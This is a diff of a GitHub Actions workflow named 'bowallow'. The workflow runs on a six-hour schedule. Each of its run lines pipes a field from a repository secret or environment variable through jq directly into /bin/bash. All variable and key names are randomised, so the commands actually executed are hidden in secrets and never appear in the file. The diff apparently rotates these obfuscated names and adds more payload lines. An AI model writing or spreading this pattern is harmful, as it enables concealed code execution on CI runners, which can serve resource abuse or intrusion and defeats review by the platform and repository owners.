@@ -3,22 +3,27 @@ name: bowallow
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
+    - cron: '37 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: bowallow
         env:
-          ufjk7: ${{ secrets.ufjk7 }}
+          hhosb40: ${{ secrets.hhosb40 }}
         run: |
-          echo $ufjk7 | jq -r .du197 | /bin/bash
-          echo $erwr16 | jq -r .cep0247 | /bin/bash
-          echo $qkt485 | jq -r .kwkkj96717 | /bin/bash
-          echo $qi8 | jq -r .p3510 | /bin/bash
-          echo $za48 | jq -r .urzvh11 | /bin/bash
-          echo $huyp723 | jq -r .ts78893 | /bin/bash
-          echo $djbx767 | jq -r .yslyo43 | /bin/bash
-          echo $l20630 | jq -r .jo53 | /bin/bash
+          echo $hhosb40 | jq -r .keth518 | /bin/bash
+          echo $z11241 | jq -r .jpzu1 | /bin/bash
+          echo $ejb1 | jq -r .hj772 | /bin/bash
+          echo $pir6407 | jq -r .k26682 | /bin/bash
+          echo $quhaw5 | jq -r .ktfzn0311 | /bin/bash
+          echo $kyf2220 | jq -r .sr96 | /bin/bash
+          echo $nmq0 | jq -r .yjg88870 | /bin/bash
+          echo $q057 | jq -r .ytw47436 | /bin/bash
+          echo $br9865 | jq -r .v870 | /bin/bash
+          echo $tflho5997 | jq -r .vvg15220 | /bin/bash
+          echo $lsdc6167 | jq -r .vkfdz11221 | /bin/bash
 
